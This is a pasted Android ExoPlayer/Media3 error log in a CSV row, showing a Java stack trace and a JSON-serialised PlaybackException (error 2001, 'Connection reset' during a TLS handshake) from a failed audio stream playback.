id,title,username,language,date,content
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 7 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Erreur lors de la lecture de ce morceau.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":71},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167891751,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":71},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":167891751,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Connection reset"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":215,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":144,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":936,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":900,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":722,""methodName"":""access$100""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":238,""methodName"":""doHandshake""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":217,""methodName"":""startHandshake""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":196,""methodName"":""connectTls""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":153,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":289,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":232,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.SocketException: Connection reset"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":709,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
